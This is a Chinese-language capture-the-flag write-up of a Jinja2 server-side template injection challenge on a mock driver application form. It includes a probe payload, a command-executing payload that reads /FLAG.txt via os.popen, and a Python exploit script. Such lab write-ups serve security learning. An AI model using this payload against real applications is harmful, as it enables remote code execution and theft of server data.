# X-080-24
## 题目描述

> The team at Swift Shipping & Transport Inc., is currently expanding its fleet and actively seeking new drivers. As you fill out the online application form, be wary of a potential Server-Side Template Injection (SSTI) vulnerability. Your challenge is to navigate the application process while investigating whether the driver application form could allow malicious input to manipulate server-side template rendering.

## 知识点

Jinja2 服务端模板注入（SSTI）

## 解题思路

- 关键路径：访问 `/application` 填写表单，表单 `POST` 到 `/submit`，服务端会把 `name` 字段拼入模板进行渲染并回显在感谢页中。
- 关键参数：`name` 字段可注入 Jinja2 表达式（SSTI）。
- 利用点：注入 `{{ cycler.__init__.__globals__.os.popen('cat /FLAG.txt').read() }}`，在模板渲染时执行命令，回显 flag。
- 使用工具与方法：
  - 手工/脚本化 `POST` 请求构造载荷；
  - 验证思路可先用 `{{7*7}}` 判断是否为 Jinja2 注入（期望回显 `49`），再升级为读取文件的 payload。

## 解题步骤

1. 访问站点首页：`GET http://ip32842/`，确认站点在线；跳转“Apply Now”到 `/application`。
2. 观察表单提交到 `/submit`，构造 `POST` 请求。
3. 先用探测载荷验证模板注入：`name={{7*7}}`，若页面回显包含 `49`，说明存在 Jinja2 SSTI。
![image.png](https://x/x12131517551.png)

4. 使用读文件载荷读取 flag：
   - `name={{ cycler.__init__.__globals__.os.popen('cat /FLAG.txt').read() }}`
   - 成功后感谢页会回显：`Thank you FLAG{...} for your submission.`
5. 最终拿到 flag：`FLAG`。
![image.png](https://x/x12131550464.png)
## EXP
```python
import re
import requests

url = "http://ip32842/submit"
payload = "{{ cycler.__init__.__globals__.os.popen('cat /FLAG.txt').read() }}"

data = {"name": payload}
res = requests.post(url, data=data, timeout=5)

m = re.search(r"Thank you\s*(FLAG\{[^}]+\})\s*for your submission", res.text)
if m:
    print(m.group(1))
else:
    pass
```